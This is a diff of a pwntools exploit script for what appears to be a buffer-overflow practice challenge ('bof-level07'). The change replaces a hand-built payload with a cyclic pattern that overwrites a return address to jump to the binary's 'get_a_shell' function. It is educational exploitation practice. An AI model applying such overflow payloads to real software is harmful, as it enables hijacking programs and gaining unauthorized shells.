@@ -2,7 +2,7 @@
 from pwn import *
 import os
 
-DEBUG = True # toggles gdb.debug or process
+DEBUG = False # toggles gdb.debug or process
 elf = ELF('./bof-level07') # replace this with the actual level
 get_a_shell = p32(elf.symbols["get_a_shell"])
 
@@ -19,12 +19,12 @@ os.unlink(core.path) # delete the file now that we're done with it
 if DEBUG:
     context.log_level = 'DEBUG'
     context.terminal = ['tmux', 'splitw', '-h']
-    io = elf.debug(env={}, gdbscript='''
-    b receive_input
+    io = elf.debug(env={'a':"aaaaaa"}, gdbscript='''
+    b *0x80485fa
     continue
     ''')
 else:
-    io = elf.process(env={})
+    io = elf.process(env={"a":"aaaaa"})
 
 
 # END SETUP BOILERPLATE
@@ -33,11 +33,8 @@ else:
 print(buffer_address)
 max_len = 0x141
 
-our_stack =  b"A" * 4 + get_a_shell
-our_stack_len = 0x8 
-our_stack_addr = p32(buffer_address + max_len - our_stack_len)
 
-payload = (b"A" * (max_len - our_stack_len - 1)) + our_stack + b"A"
+payload = cyclic(max_len).replace(b"ajaa", get_a_shell)
 io.sendline(payload)
 
 # END CHALLENGE-SPECIFIC CODE
